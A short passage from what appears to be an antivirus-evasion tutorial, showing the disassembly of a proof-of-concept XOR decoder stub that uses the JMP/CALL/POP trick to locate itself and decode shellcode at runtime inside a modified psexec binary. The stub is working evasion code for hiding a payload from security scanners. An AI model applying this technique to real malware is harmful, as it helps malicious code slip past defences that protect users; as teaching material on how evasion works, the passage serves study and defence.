we still need our XOR stub, to encrypt the binary on disk and decode it at runtime. 
I made this proof of concept XOR stub that support position independent code, 
which uses JMP/CALL/POP and registers to keep track of the encoding routine.

013C90E8  JMP SHORT psexec_e.013C90EA   ; JMP/CALL/POP technique in action...
013C90EA  CALL psexec_e.013C90EF        ; to get hold of EIP...
013C90EF  POP EAX                       ; and save it EAX
013C90F0  MOV EDX,EAX                   ; saves EIP in EDX
013C90F2  ADD EDX,32                    ; EDX stores the shellcode start's RVA
013C90F5  ADD EAX,186                   ; EAX stores the shellcode end's RVA
013C90FA  XOR BYTE PTR DS:[EDX],0F      ; same instructions as before
013C90FD  INC EDX
013C90FE  CMP EDX,EAX
013C9100  JLE SHORT psexec_e.013C90FA
013C9102  JMP SHORT psexec_e.013C911C


We still have to face the challenge of hijacking string references with short 
jumps or by other means that do not involve static addressing.


Source: https://www.matteomalvica.com/tutorials/av-evasion/
